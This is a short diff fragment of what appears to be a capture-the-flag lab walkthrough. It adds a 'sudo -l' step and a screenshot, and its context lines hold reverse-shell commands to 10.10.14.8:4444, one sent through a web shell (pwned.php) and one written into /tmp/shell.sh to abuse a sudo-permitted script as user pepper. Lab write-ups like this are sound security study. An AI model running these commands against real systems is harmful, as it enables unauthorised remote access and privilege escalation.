@@ -63,6 +63,13 @@ curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash 
 
 
 ```
+sudo -l
+```
+![image](https://user-images.githubusercontent.com/33616880/231978294-ddc1284d-62b6-4669-ad17-5b0ec362a773.png)
+
+
+
+```
 echo 'bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"' > /tmp/shell.sh
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 ```
